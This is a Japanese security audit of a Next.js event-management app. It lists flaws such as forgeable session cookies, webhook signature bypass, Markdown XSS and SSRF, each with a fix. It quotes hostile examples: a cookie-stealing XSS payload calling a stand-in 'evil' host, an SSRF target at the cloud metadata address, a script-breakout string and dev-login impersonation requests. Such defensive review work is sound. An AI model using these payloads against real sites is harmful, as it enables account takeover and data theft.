# tech-event セキュリティレビュー

レビュー対象: `/Users/mac_ai/repos/tech-event` (Next.js 16 / App Router / Prisma 7 / SQLite)
レビュー日: 2026-06-05
レビュー方針: Read-only。Critical/High/Medium/Low/Best Practice の 5 段階で issue を分類。攻撃シナリオを明記。

---

## Executive Summary

| Severity      | 件数 |
| ------------- | ---- |
| Critical      | 6    |
| High          | 11   |
| Medium        | 10   |
| Low           | 6    |
| Best Practice | 7    |

主なリスク領域:

1. **認証 cookie 設計が不十分** — `te_session` に `User.id` を平文・無署名で格納しているため、cookie 値を任意のユーザー ID に書き換えるだけで他人になりすませる。HttpOnly 属性で JS からの直接窃取は防げるが、XSS や中間者攻撃、その他の経路で 1 件でも書き込み手段があれば即座にアカウント乗っ取り可能。
2. **OAuth signIn の email リンク** — 既存ユーザーへ email 一致だけで OAuthIdentity を紐付ける挙動。攻撃者が email-verify されていない OAuth Provider 上で被害者の email を主張すれば既存アカウントを奪える。
3. **Stripe webhook フォールバック** — STRIPE_WEBHOOK_SECRET 未設定時に署名検証をスキップ。production で env 設定ミスがあるとリクエスト偽装で「無料で参加 accepted + Payment succeeded」に持ち込める。
4. **Markdown XSS** — `marked` 出力を sanitize 無しで `dangerouslySetInnerHTML`。主催者が `<img onerror>` 等を埋め込めば閲覧者全員に対し XSS。`MarkdownEditor` プレビューも同様 (self-XSS+クリックジャック等の組合せで悪用余地あり)。
5. **Slack Webhook URL SSRF** — グループ管理者が任意の `http(s)://` URL を `slackWebhookUrl` に登録可能で、サーバから AWS metadata / 内部 IP / localhost への POST が許される。
6. **dev-login / test API** — `NODE_ENV !== "production"` のみで disable。VPS の `NODE_ENV` 不一致や staging 環境で誤ってこのまま晒すと、任意のユーザーに 1-step なりすまし可能。

---

## Critical (即修正必須)

### 1. `te_session` Cookie が改ざん可能 (なりすまし)

- 位置: `src/lib/auth.ts:77-88`、`src/lib/auth.ts:55-71`
- 説明: cookie には `User.id` (BigInt) が平文で入っているだけで、HMAC 署名も暗号化も無い。`getCurrentUser()` は cookie の文字列を `BigInt` に変換し、その ID で `prisma.user.findUnique` するだけ。

```ts
// src/lib/auth.ts:77-88
c.set(SESSION_COOKIE_NAME, value, {
  httpOnly: true,
  sameSite: "lax",
  path: "/",
  maxAge: SESSION_MAX_AGE_SEC,
  secure: process.env.NODE_ENV === "production",
});
```

- リスク:
  - **攻撃シナリオ A**: 他経路 (Reflective XSS、サブドメイン上の別アプリの脆弱性、共有端末の DevTools、CSRF + cookie 書き換え) で cookie を別ユーザーの ID にすり替えれば即座にそのユーザーとしてアクション可能 (CRUD/決済/個人情報閲覧全て)。
  - **攻撃シナリオ B**: User.id は連番採番 (`_max+1`) で予測容易。`te_session=1` で最古のユーザー (= 管理者になっている可能性が高い) を狙える。
  - HttpOnly は付与済みなので document.cookie 経由の窃取は防げるが、署名されていない以上「サーバ側で改ざんを検知できない」点が致命的。
- 修正案:
  - JWT 化: `iron-session` / `next-auth` JWT セッション / 自前で `jose` の HS256 か Ed25519 で署名。auth.ts は既に next-auth JWT を使っているので `te_session` を廃止し全面的に `auth()` に寄せる。
  - もしくは最小限の修正として、`crypto.createHmac("sha256", AUTH_SECRET).update(userId).digest("base64url")` を付与し検証する。

### 2. OAuth signIn で email 一致による自動アカウントリンク (アカウントテイクオーバー)

- 位置: `auth.ts:54-114`
- 説明: `upsertOAuthUser` は (provider, providerUid) に紐づく `OAuthIdentity` が無い場合、`email` で既存 User を引いて自動リンクする。email-verified かどうかのチェックは無い。

```ts
// auth.ts:62-67
let userId: bigint | null = null;
if (email) {
  const u = await prisma.user.findUnique({ where: { email } });
  if (u) userId = u.id;
}
```

- リスク:
  - **攻撃シナリオ**: GitHub などで email が verify されていないアカウントを攻撃者が用意し、被害者の email (例: `victim@example.com`) を Primary email に登録する。被害者の tech-event アカウントが email + password / Magic Link で登録されていれば、GitHub OAuth ログインだけでそのアカウントの OAuthIdentity を奪取し、被害者として恒久的にログインできる。
  - Twitter は元々 email を返さない/オプトインだが、Facebook と GitHub は verify 状況によらず email を返すケースがある (特に GitHub の primary email)。
- 修正案:
  - email でリンクする前に provider が email を verified として返しているかを確認 (GitHub: `email_verified` または `verified` フィールド、Facebook: email scope 付き)。Twitter は同等情報無いので新規ユーザー作成のみ。
  - もしくは「既存ユーザーへのリンクは、本人が settings ページから明示的に OAuth Connect 操作したときのみ」に限定する。

### 3. Stripe Webhook 署名検証が未設定環境で完全スキップされる

- 位置: `src/app/api/payments/webhook/route.ts:71-92`
- 説明: `STRIPE_WEBHOOK_SECRET` が未設定 or `Stripe-Signature` ヘッダなしのリクエストは JSON.parse のみで処理が進む。production の設定漏れに気付けない構造。

```ts
// src/app/api/payments/webhook/route.ts:71-92
if (stripe && webhookSecret && signature) {
  // 正規パス
} else {
  // Stripe 未設定 / 署名なしのフォールバック (dev / E2E 用)
  event = JSON.parse(rawBody) as CheckoutCompletedEvent;
}
```

- リスク:
  - **攻撃シナリオ**: production で `STRIPE_WEBHOOK_SECRET` が誤って空のまま (もしくは `STRIPE_SECRET_KEY` だけ未設定) になっている場合、攻撃者は任意の JSON POST だけで:
    - 任意 (event, role, user) の組合せで Participant.status を `accepted` に昇格
    - 偽の Payment レコードを `status: "succeeded"` で挿入
    - `Event.acceptedCount` を膨張
  - eventId / eventRoleId は数値連番なので総当たりも可能 (= 不正参加・キャパシティ枯渇 DoS)。
- 修正案:
  - `process.env.NODE_ENV === "production"` で webhookSecret/stripe/signature の 3 つが揃っていなければ 500 (or 503) で fail-close する。
  ```ts
  if (process.env.NODE_ENV === "production" && (!stripe || !webhookSecret || !signature)) {
    return NextResponse.json({ error: "webhook_misconfigured" }, { status: 500 });
  }
  ```
  - dev/test バイパスは `NODE_ENV !== "production"` でのみ許可。

### 4. Markdown レンダリングでの XSS (主催者 → 全閲覧者)

- 位置:
  - `src/app/event/[id]/page.tsx:82` (marked.setOptions 設定のみ、sanitize なし)
  - `src/app/event/[id]/page.tsx:619-624` (description html injection)
  - `src/app/group/[subdomain]/page.tsx:290`, `599-600`, `1109` (group description)
  - `src/app/user/[nickname]/page.tsx:236, 359, 912` (user bio)
  - `src/app/calendar/[slug]/page.tsx:129, 275` (calendar description)
  - `src/components/MarkdownEditor.tsx:188-191, 382-386` (プレビュー)
- 説明: `marked.parse(description, { async: false })` の戻り値を sanitize せずに `dangerouslySetInnerHTML` に渡している。`marked` v18 はデフォルトで raw HTML を素通しする。
- リスク:
  - **攻撃シナリオ**: 主催者が event description に `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">` を埋め込む → イベント詳細ページを開いた全閲覧者のブラウザで実行 → cookie は HttpOnly なので直接窃取は失敗するが、`fetch('/api/...')` で被害者のセッション権限を借りた CSRF (グループ作成 / コメント投稿 / Slack Webhook URL 改変など) が可能。
  - User bio / Group description は誰でも編集できる箇所もあり、被害範囲が広い。
  - JSON-LD の `dangerouslySetInnerHTML={{ __html: JSON.stringify(...) }}` も `</script>` を含む文字列で script breakout 可能。
- 修正案:
  - `marked` の出力を DOMPurify (isomorphic-dompurify) や `sanitize-html` でホワイトリスト sanitize する。
  ```ts
  import DOMPurify from "isomorphic-dompurify";
  const safe = DOMPurify.sanitize(marked.parse(text, { async: false }) as string, {
    USE_PROFILES: { html: true },
    FORBID_TAGS: ["script", "iframe", "object", "embed"],
    FORBID_ATTR: ["onerror", "onload", "onclick", "onmouseover"],
  });
  ```
  - JSON-LD は `JSON.stringify(...).replace(/</g, "\\u003c")` 等で script タグ閉じを防ぐ。

### 5. Slack Webhook URL での SSRF

- 位置: `src/lib/slack.ts:32-55`、`src/app/actions/group-actions.ts:46-48, 60, 199, 308`
- 説明: グループ管理者が自由に `https?://` で始まる任意の URL を `slackWebhookUrl` として登録できる。`sendSlackWebhook` は host 検証なしで `fetch(url, ...)` を実行する。

```ts
// src/lib/slack.ts:36-44
if (!url || typeof url !== "string") return { ok: false, error: "no_url" };
if (!/^https?:\/\//.test(url)) return { ok: false, error: "invalid_url" };
const res = await fetch(url, { method: "POST", ... body: JSON.stringify(payload) });
```

- リスク:
  - **攻撃シナリオ**:
    - `http://169.254.169.254/latest/meta-data/iam/...` (AWS IMDS) を webhook URL に設定し、グループ owner が `comment_posted` / `lottery_result` / `event_published` トリガで内部 IP に対して認証情報付き POST を強要できる。レスポンスは戻さないが、IMDSv2 でなければトークン窃取は別 IMDS 経由で可能。
    - `http://localhost:5432` (内部 DB) / `http://kibana-internal` (社内ツール) など、別サービスへの認証なしリクエストで意図しない副作用 (例: トリガ URL 系) を起こす。
    - DNS rebinding: 1 回目で外部 IP、2 回目で内部 IP を返す DNS を仕掛け、TOCTOU で内部にアクセス。
- 修正案:
  - Slack 公式 incoming webhook はホスト固定なので `^https://hooks\.slack\.com/services/` のみ許可する。
  - もしくは IP 解決して private/loopback/link-local を弾く (resolve → IP 範囲チェック → 接続 → connect 中に DNS rebinding 検知)。
  - URL 検証は `URL` でパースし `url.protocol === "https:"` を必須、`url.hostname` に対し allowlist。

### 6. dev-login / test endpoint の disable 判定が脆い

- 位置:
  - `src/app/api/auth/dev-login/route.ts:24-26`
  - `src/app/api/test/set-slack-webhook/route.ts:12-14`
  - `src/app/api/test/slack-catcher/route.ts:29-34`
  - `src/app/api/test/reset-event-status/route.ts:12-14`
- 説明: いずれも `process.env.NODE_ENV === "production"` の比較のみで disable する。Vercel/Cloud Run/Docker などで `NODE_ENV=development` のまま production に上げてしまうケース、もしくはステージング (`NODE_ENV=staging` / 未設定) では完全に晒される。
- リスク:
  - **攻撃シナリオ**: ステージング URL を発見した攻撃者が `GET /api/auth/dev-login?nickname=admin` でログイン状態を奪取 → そのまま prod と同等のデータにアクセス、もしくは prod に流用される画像/設定を改ざん。
  - `POST /api/test/set-slack-webhook?groupId=...&url=...` で任意 group の slackWebhookUrl を上書き → SSRF (Critical #5) と組合せて昇格。
- 修正案:
  - 2 段ガード: `NODE_ENV === "production"` または明示的なフラグ `ENABLE_TEST_ROUTES !== "1"` の **どちらか** が成立すれば 404。
  - ファイル単位で `if (!process.env.ENABLE_TEST_ROUTES) return new NextResponse("Not Found", { status: 404 });`
  - 加えて、ビルド時に `/api/test/*` `/api/auth/dev-login` を `unstable_excludeFiles` または Webpack alias で production バンドルから除外。

---

## High (1 週間以内)

### 7. Magic Link verify GET メソッドでトークンを消費 (CSRF / prefetch リスク)

- 位置: `src/app/api/auth/magic-link/verify/route.ts:60-126`
- 説明: GET リクエストで `usedAt` を埋め、setSessionCookie してリダイレクト。クリック型 UX としては妥当だが GET で副作用 (= ログインセッション発行 + DB 状態変更) は HTTP の原則違反であり、複数の自動 prefetch (Outlook Safe Links / Slack unfurl / Gmail anti-phishing scanner / ブラウザ prefetch / メーラーの「リンク先プレビュー」など) でトークンが先に消費される実害がある。
- リスク:
  - **シナリオ A** : Outlook の Safe Links が verify URL を自動展開 → トークン消費済みでユーザがクリックしても `token_already_used`。
  - **シナリオ B** : 攻撃者が被害者の token を入手しても、GET で 1 度クリックされれば消費されるので window は短いが、SafeLink / セキュリティスキャナが先回りで消費する → 攻撃者の使い回し検知に失敗する形で trust が崩れる。
- 修正案:
  - verify を 2 段階に: GET で「Continue with magic link」ボタンの HTML を返し、ボタン押下で POST → セッション発行。
  - もしくは `User-Agent` をホワイトリストでフィルタしブラウザ以外を弾く (緩和)。
  - トークンを `consumedFor` (string, IP / UA hash) に拘束し、同一 UA だけ受け入れる。

### 8. Open redirect の可能性 (`next` パラメータの検証は OK だが他に未検証経路)

- 位置:
  - `src/app/api/auth/login/route.ts:24-30` (`safeNextPath`) ← OK
  - `src/app/api/auth/dev-login/route.ts:16-21` ← OK
  - `src/app/api/auth/magic-link/verify/route.ts:123-125` ← `/dashboard` 固定で OK
  - **`signup` ページなどでクライアントから `next` を埋め込む箇所**: `src/app/signup/page.tsx:203` で `next` 文字列をそのまま href に組み込む実装あり (要詳細確認)
  - `src/app/actions/lottery-actions.ts:260` 等 Server Action 内の `redirect(``/login?next=...``)` ← 自前で encode 済み、OK
- 説明: `safeNextPath` は `/` 始まり & `//` 拒否で適切。ただし `:` を含むパス (例: `/javascript:alert(1)`) は防げない。Next.js の `redirect()` 自体は相対パスならホスト変更不可なので影響は限定的だが、明示防御を入れたい。
- リスク: 限定的 (Next.js の挙動依存)
- 修正案: `safeNextPath` に `if (raw.includes(":")) return "/dashboard"` を追加。

### 9. Stripe Webhook の idempotency が DB 状態依存 (リプレイ window 制御なし)

- 位置: `src/app/api/payments/webhook/route.ts:120-216`
- 説明: 署名検証だけで `event.id` の重複処理ガードがない。Stripe が retry を投げる、もしくは攻撃者が一度キャプチャした正規 webhook を再送した場合、(participantId, payment) が既に存在すれば `update` で済むが、同じ checkout 結果が次の payment_intent で新しい event として送られた場合に状態がずれる可能性。Stripe の Replay window は最大 5 分、署名は完了済みなのでリプレイ攻撃自体は防げているが、`event.id` の processed 記録は best practice。
- リスク: 低-中
- 修正案: `processed_webhook_events` テーブルに `event.id` を UNIQUE で保存し、既存なら 200 で即 return。

### 10. Stripe Checkout の `customer_email` で email 漏洩はないが metadata 改竄に対する事後検証なし

- 位置: `src/app/actions/payment-actions.ts:112-116`、`src/app/api/payments/webhook/route.ts:99-118`
- 説明: webhook ハンドラは `metadata.userId` を信用して Participant を作成する。metadata は Stripe Checkout 作成時にサーバ側が埋めるので通常は安全だが、event.data.object に対する追加の整合性確認 (`metadata.userId` が `customer_email` と一致する User と紐づくか) は無い。
- リスク:
  - 直接の攻撃シナリオは Stripe webhook が攻撃者の任意 metadata を許す場合のみ。署名検証 (Critical #3 修正後) があれば実害は限定的。
- 修正案: 防御深層化として、webhook 内で `metadata.userId` と関連 User をクロスチェック (`prisma.user.findUnique`)、`role.eventId === metadata.eventId` 確認 (これはやってる)。

### 11. API キー比較が timing-unsafe

- 位置: `src/lib/public-api.ts:37-62`
- 説明: `provided !== expected` の文字列直接比較。timing side-channel 攻撃で API キーを 1 文字ずつ突き止められる理論的可能性。
- リスク:
  - 実環境では HTTP のジッタ・並列処理で実用的タイミング攻撃は困難だが、constant-time 比較は標準的セキュリティ要件。
  - 公開 API キーが 32 文字の hex なら 16^32 = 約 10^38 の探索空間。リアル攻撃は困難。
- 修正案:
  ```ts
  import { timingSafeEqual } from "node:crypto";
  function safeEq(a: string, b: string): boolean {
    if (a.length !== b.length) return false;
    return timingSafeEqual(Buffer.from(a), Buffer.from(b));
  }
  ```

### 12. 公開 API レート制限のグローバルバイパスと回避

- 位置: `src/lib/public-api.ts:68-99, 207-215, 226-228`
- 説明:
  - レート制限は **APIキー単位** のみ。匿名アクセス (= 401 で先に弾かれる) は問題ないが、複数キー発行を想定すれば 1 アカウント当たり 1 req/sec しか縛れず、CDN レイヤなしに展開すると大規模スクレイピングに無力。
  - `process.env.NODE_ENV !== "production"` のとき `X-Test-Bypass-Rate-Limit: 1` ヘッダでバイパス可能 (#6 と同根: NODE_ENV 設定ミス時に bypass される)。
  - in-memory Map (`globalThis.__publicApiRateMap`) はインスタンス間で共有されないため、複数インスタンスで効かない。
- リスク:
  - **シナリオ**: API キー 1 件で 1 sec/req は厳しいが、Round-robin で 100 個 IP からなら無効。
  - production で `NODE_ENV=development` のまま起動 → ヘッダ送るだけで rate limit 完全無効化。
- 修正案:
  - 共有ストレージ (Redis / Upstash KV) ベースの sliding window へ。
  - bypass ヘッダは production で完全 disable に。
  - IP 単位の rate limit を追加 (`request.headers.get("x-forwarded-for")` の先頭をパース)。

### 13. 画像アップロード MIME type 検証が拡張子/Content-Type 依存 (magic byte 未検証)

- 位置:
  - `src/app/api/uploads/image/route.ts:62-80`
  - `src/lib/storage.ts:48-54, 125-160`
- 説明: `file.type` (= ブラウザの Content-Type) と filename 拡張子のみ。`ALLOWED_MIMES` に含まれていれば pass。
- リスク:
  - **攻撃シナリオ**: クライアントが Content-Type を `image/png` に偽装し、中身が `<script>` を含む SVG/HTML を送信。`sharp` が処理しないコードパス (`raw` kind は元 buffer をそのまま `public/uploads/` に保存) で `.png` 拡張子の polyglot ファイルを置く。
    - Next.js `public/` 配下は MIME 推定で配信されるため、最終的に被害者に届く Content-Type は拡張子依存になり SVG/JS としては実行されない可能性が高いが、HTML として開かれる流入 (直接 URL シェアでブラウザが sniff) や CDN 設定ミスでは XSS につながる。
    - GIF89a + JS の polyglot を `.gif` で配置し、`<img src>` で読み込まれるところに XSS payload を仕込む手法。
- 修正案:
  - magic byte で検証: `sharp(buffer).metadata()` で format 取得し、宣言 MIME と一致するか検証。
  - `kind === "raw"` を撤廃するか、sharp での format 再エンコードを必須化。
  - `Content-Security-Policy: default-src 'self'` で XSS 影響を緩和。

### 14. `public/uploads/` への直接保存 (本番ファイルシステム書込)

- 位置: `src/lib/storage.ts:166-177`
- 説明: local provider で `path.join(process.cwd(), "public", "uploads", yyyy, mm, filename)` に書き込む。yyyy/mm は内部生成・filename は UUID なのでパストラバーサルの直接的リスクは低い。
- リスク:
  - 本番がコンテナ readonly FS や Vercel serverless の場合、書き込み自体が失敗するか、永続化されない (再起動で消失)。
  - 大量アップロードで disk full → DoS。サイズ上限はあるが個数制限なし。
- 修正案:
  - 本番は S3 強制 (`STORAGE_PROVIDER=local` で起動したら起動時 warn or refuse)。
  - upload 数の per-user 制限 (例: 1 日 50 枚)。

### 15. AUTH_SECRET にフォールバック値が入る (production で fail-close すべき)

- 位置: `auth.ts:136`
- 説明: `secret: process.env.AUTH_SECRET || "dev-auth-secret-please-change"` のフォールバック。NODE_ENV=production で AUTH_SECRET 未設定でも起動してしまう。
- リスク:
  - 既知のフォールバック文字列で JWT を署名すると、攻撃者が任意の JWT を発行可能 (`session.user.id` 任意設定 → `getCurrentUser()` 経由でなりすまし)。
- 修正案:
  ```ts
  const secret = process.env.AUTH_SECRET;
  if (!secret) {
    if (process.env.NODE_ENV === "production") {
      throw new Error("AUTH_SECRET must be set in production");
    }
  }
  ```

### 16. CRON エンドポイントのシークレットが URL クエリ経由

- 位置: `src/app/api/cron/run-lotteries/route.ts:36-40`
- 説明: `GET /api/cron/run-lotteries?secret=xxx` の query string で secret を渡す。
- リスク:
  - access log / proxy log / Referer header にシークレットが漏れる (ブラウザ間接アクセスは無いがリンク誤クリックや CDN ログには残る)。
  - production の Vercel Cron は HEADER ベースのほうが推奨。
- 修正案:
  - `request.headers.get("authorization") === ``Bearer ${secret}``` に切り替え。
  - secret は constant-time 比較 (#11)。

### 17. Comment 削除に主催者 / 管理者の救済パスが無い (運用上の問題)

- 位置: `src/app/actions/comment-actions.ts:236-254`
- 説明: `comment.userId !== user.id` の場合 forbidden。主催者・admin は不適切コメントを削除できない。これは脆弱性ではないが「主催者が見過ごせない投稿 (個人情報暴露・スパム) を放置する」攻撃面となる。
- リスク: 中 (運用・コンテンツモデレーション)
- 修正案: `event.ownerId === user.id || groupAdmin === true` の条件追加。

### 18. `joinPaidEvent` の eventRoleId バリデーションが弱い

- 位置: `src/app/actions/payment-actions.ts:147-180`
- 説明: `formData.get("eventId")` は regex で検証するが `formData.get("eventRoleId")` は `createCheckoutSession` 側まで unvalidated に伝播。`createCheckoutSession` 内で zod 検証はあるが redirect 経由で動くため、不正値時のフローが明確でない (throw `invalid_input` → 500 ページ表示)。
- リスク: 低 (Zod で最終的に弾かれる)
- 修正案: `joinPaidEvent` で先に eventRoleId regex 検証し、不正なら適切な redirect。

### 19. Server Action / API Route の認可チェック漏れリスク (横展開する `_max+1` ID 採番との合成)

- 位置: 全 Server Action (例: `event-admin-actions.ts:539-546`)
- 説明: 全 Server Action で必ず `getCurrentUser` + 所有権チェックを実施している点は良好。ただし `canManageEvent` の確認後に `participant.eventId !== eventId` のような related-entity チェックを毎回手動で書いており、書き漏れがあれば horizontal privilege escalation (他イベントの participant を操作) になる。実際 `updateParticipantRole` (event-admin-actions.ts:577-595)、`removeParticipant` (605-647)、`approveParticipant` (108-115) は `participant.eventId === eventId` を確認しているので OK。
- リスク: 個別行は OK だが、横展開のミス可能性は残る。
- 修正案: prisma の `where: { id: participantId, eventId: eventId }` でクエリ自体に紐付け、見つからなければ throw する Helper を共通化。

### 20. JSON-LD 注入 (script breakout)

- 位置:
  - `src/app/page.tsx:219` (HOME_JSON_LD)
  - `src/app/group/[subdomain]/page.tsx:340, 898`
  - `src/app/user/[nickname]/page.tsx:288, 807`
  - `src/app/event/[id]/page.tsx:982`
  - `src/components/Breadcrumb.tsx:103`
- 説明: `dangerouslySetInnerHTML={{ __html: JSON.stringify(...) }}` で JSON-LD を埋め込んでいる。値に `</script>` を含むと早期に script を閉じられて XSS。
- リスク:
  - **攻撃シナリオ**: User.bio や Group.description に `"</script><script>alert(1)</script>` のような文字列を含めると JSON-LD ブロックに展開され、`</script>` の途中閉じで script breakout → XSS。
- 修正案:
  ```ts
  const safeJson = JSON.stringify(jsonLd)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026");
  ```

### 21. `marked.parse` が同期実行で長文をブロック (DoS)

- 位置: `src/app/event/[id]/page.tsx:325-327` 他
- 説明: description は最大 50_000 文字。同期 marked.parse はブロッキングで、複雑な markdown を多数同時 SSR すると Event Loop ブロック → 全体 latency 悪化。
- リスク: 低-中 (DoS の機会)
- 修正案: marked を async 化、もしくは `Promise.all` で並列処理しないことを担保。

---

## Medium (1 ヶ月以内)

### 22. メール存在を error メッセージで漏らさない (login 経路は OK だが timing で見える)

- 位置: `src/app/api/auth/login/route.ts:88-105`
- 説明: 「ユーザー無し」と「パスワード不一致」を同一エラー (`invalid_credentials`) で返している ✅。ただし bcrypt 計算の有無で timing 差異が出る (登録 email は ~150ms 程度、未登録は < 5ms)。
- リスク: User enumeration via timing。
- 修正案: 未登録時もダミー hash で bcrypt.compare を実行して timing を揃える。
  ```ts
  const DUMMY_HASH = "$2b$10$........";
  await bcrypt.compare(password, user?.passwordHash ?? DUMMY_HASH);
  ```

### 23. レート制限の欠如 (login / magic-link / signup / comment-post)

- 位置:
  - `src/app/api/auth/login/route.ts:75-129`
  - `src/app/api/auth/magic-link/request/route.ts:51-101`
  - `src/app/actions/comment-actions.ts:87-215`
- 説明: いずれもレート制限なし。
- リスク:
  - login: brute-force 攻撃 (bcrypt は cost で軽減されるが per-account ロックアウトが無いので大規模 credential stuffing に脆弱)。
  - magic-link: 任意 email へのメール送信を無制限 → spam relay / mail bomb 攻撃。
  - comment: スパム投稿。
- 修正案:
  - per-IP + per-account の rate limit (Redis / Upstash)。
  - magic-link は per-email で 5 リクエスト / 15 分 など。

### 24. Magic Link でメール文字列を SQLite に lowercase 保存するが、verify 時に DB の `email` をそのまま `findOrCreateUserByEmail` に流す

- 位置: `src/app/api/auth/magic-link/verify/route.ts:30-58, 93`
- 説明: request 時に `email.toLowerCase()` で MagicLinkToken に保存。User.email は seed 等で大文字混在の可能性あり。`prisma.user.findUnique({ where: { email } })` は SQLite ではデフォルト case-sensitive なので、大文字混在の既存ユーザーは別レコードとして新規作成される。
- リスク: アカウント重複・予期せぬ新規ユーザー生成 (verify したい先と別アカウントになる)。直接の権限昇格にはならないが運用上の事故になる。
- 修正案: User.email は normalize して INSERT/UPDATE 時に lowercase。

### 25. Blast 配信で email 漏洩 (BCC 相当の送信)

- 位置: `src/app/actions/event-admin-actions.ts:697-758`
- 説明: `Promise.all(recipientUsers.map((u) => sendMail({ to: u.email, ... })))` で個別送信 ✅。To に他参加者は混じらないので問題なし。ただし `console.log("[blast] event=... recipients=N subject=...")` で件名・件数をログ。
- リスク: 低
- 修正案: 件名そのまま console.log で十分。ただし PII を含む subject は注意。

### 26. Event.description / Group.description のサニタイズ不足が Slack へも伝播

- 位置: `src/lib/slack.ts:102-114`
- 説明: `notifyCommentPosted` でコメント本文を Slack へそのまま投げる (200 文字切り)。Slack は markdown を解釈するので `*` `_` `<url|text>` 等の構文が変換される (低リスク)。
- リスク: 低
- 修正案: Slack 向けに `<` `>` `&` をエスケープ。

### 27. CORS が `*` で広め

- 位置: `src/lib/public-api.ts:136-142`
- 説明: `Access-Control-Allow-Origin: *` 固定。API キーが必要なので CSRF 経由のなりすましリスクは無いが、key を流出させた場合の被害が広がる。
- リスク: 低
- 修正案: 認証必要 API なので公開でも実質安全だが、運用上 allowlist 推奨。

### 28. Server Action の CSRF 対策の暗黙的依存

- 位置: 全 Server Actions
- 説明: Next.js App Router の Server Action は内蔵で Origin/Host check が入る (next.config の `serverActions.allowedOrigins` 未設定なら自動で同一 origin のみ受付)。`next.config.ts:1-22` で `serverActions` 設定は無いのでデフォルト挙動。
- リスク: 低 (Next.js デフォルトで保護)
- 修正案: 念のため `serverActions: { allowedOrigins: ["yourdomain.com"] }` を明示。

### 29. `formValueRaw` で trim せず保存する箇所 (zero-width characters / 先頭末尾空白)

- 位置: `src/app/actions/event-admin-actions.ts:35-38` 等
- 説明: description などを trim せず格納。XSS は #4 で別議論。
- リスク: 微小 (表示崩れ程度)
- 修正案: 表示時に必要な trim を入れる。

### 30. nickname / subdomain / slug の禁忌語チェック無し

- 位置: `src/app/actions/group-actions.ts:39-43` (subdomain)、`src/app/actions/calendar-actions.ts:37-41` (slug)
- 説明: `[a-z0-9-]+` のみ。`admin`, `api`, `login`, `signup`, `dashboard`, `assets` などのシステムパスと衝突する subdomain/slug を作れる。
- リスク:
  - **シナリオ**: 攻撃者が `/group/login` を作って phishing 文面を埋め込む。実際の `/login` パスとは別だが、URL の見た目で誤誘導。
- 修正案: reserved word リスト (`admin`, `api`, `login`, `signup`, `dashboard`, `event`, `static`, `auth`, `_next`, `users`) を弾く。

### 31. AuditLog テーブルが定義されているが書き込みコードなし

- 位置: `prisma/schema.prisma:501-515` (定義のみ)
- 説明: AuditLog schema は ip/ua/metadata 用意済みだが、実際に書き込む箇所が 0 件。重要操作 (publish, delete, payment) の監査記録がない。
- リスク: 中 (forensic capability ゼロ、不正アクセス後の追跡困難)
- 修正案: 主要 Server Action (publishEvent, cancelEvent, sendBlast, approve/reject, runLottery) で `prisma.auditLog.create` を追加。

---

## Low (将来対応)

### 32. `signOut` (logout) が CSRF token 無し

- 位置: `src/app/api/auth/logout/route.ts:7-17`
- 説明: POST だが特に追加トークンなし。Next.js Server Action と違い純粋な Route Handler なので、3rd 党 site から `<form action=".../api/auth/logout" method=POST>` で強制ログアウト可能。
- リスク: 軽微 (ユーザーを煩わせるのみ)
- 修正案: Same-Site Cookie のおかげで cookie が付かない (= 既にログアウト状態と区別不可能) ので実害は低い。SameSite=Strict にすればさらに安心。

### 33. `themeBackgroundStyle: "image"` の URL 検証なし (将来拡張用)

- 位置: `src/app/actions/event-admin-actions.ts:82-83`
- 説明: enum で `solid|gradient|image` を受けるが、image の場合の URL フィールドが未実装。
- リスク: 未来の拡張で SSRF/外部リソース読込の経路になりうる。
- 修正案: 実装時に URL allowlist を準備。

### 34. error message が技術的詳細を露出

- 位置: `src/app/actions/group-actions.ts:228-244` 等 (UNIQUE constraint message を redirect クエリに展開)
- 説明: Prisma エラーの一部メッセージを `?message=` に含めて表示。schema 情報が漏れる可能性。
- リスク: 低
- 修正案: i18n 経由の固定文言にマップ。

### 35. `src/app/api/v2/events/route.ts:207-209` の host header 信頼

- 位置: `src/app/api/v2/events/route.ts:207-209` 他公開 API 全般
- 説明: `request.headers.get("host")` をそのまま URL に埋め込む。
- リスク:
  - Host header injection で URL 中に攻撃者のドメインが入る → API 応答を信じる別アプリが誤誘導される。
- 修正案: `NEXT_PUBLIC_BASE_URL` を優先。

### 36. middleware の `x-pathname` ヘッダ注入の信頼性

- 位置: `src/middleware.ts:39-40`
- 説明: middleware で必ず上書きしているので downstream で `headers().get("x-pathname")` を読むのは安全。client が同名ヘッダを送ってきても middleware が再セットするため override される。
- リスク: 低 (現状の実装は安全)
- 修正案: 念のため `headers.delete("x-pathname"); headers.set("x-pathname", ...)` で明示クリアも検討。

### 37. dev.db / dev.db.baseline を repo に置いている

- 位置: `dev.db`、`dev.db.baseline`
- 説明: `.gitignore` に `*.db` があり commit はされないが、ローカルディレクトリに seed user の password hash が含まれる SQLite ファイルが残る。共有 PC では情報源。
- リスク: 微小 (gitignored)
- 修正案: 開発用ドキュメントで言及するのみ。

---

## Best Practices (改善提案)

### 38. Content Security Policy (CSP) 未設定

- 位置: `src/app/layout.tsx` 周辺、`next.config.ts`
- 説明: CSP ヘッダなし。Markdown XSS (#4) を緩和する重要な depth-in-defense。
- 提案: `next.config.ts` で `headers()` を定義し、`Content-Security-Policy: default-src 'self'; img-src 'self' data: https://*; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'` 等から開始。

### 39. Security ヘッダ全般

- 位置: `next.config.ts`
- 説明: `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security`, `Permissions-Policy` 等が未設定。
- 提案: Next.js の `headers()` 設定で一括追加。

### 40. パスワードポリシー

- 位置: `src/app/api/auth/login/route.ts:18-22` (min 1)、signup 経路 (未確認)
- 説明: zod schema は `password.min(1)` のみ。signup 側で複雑度要件確認推奨。
- 提案: min 12 文字、辞書チェック (`zxcvbn` 等)。

### 41. bcrypt cost factor 確認

- 位置: `auth.ts:170`、`src/app/api/auth/login/route.ts:99`
- 説明: bcrypt の cost は default 10 で OK。確認のみ。
- 提案: 2026 年時点では cost 12 推奨。signup 側の `bcrypt.hash(pw, 12)` を確認。

### 42. クエリパラメータでの `secret` 渡し全般

- 位置: cron #16 と同根
- 提案: ヘッダ経由に統一。

### 43. `getCurrentUser()` の循環 import 回避が dynamic import (パフォーマンス)

- 位置: `src/lib/auth.ts:32`
- 説明: 動的 import で next-auth を遅延ロード。auth と te_session の二重認証パスは複雑性とバグ余地が大きい。
- 提案: 全面的に next-auth JWT へ移行し te_session を廃止。

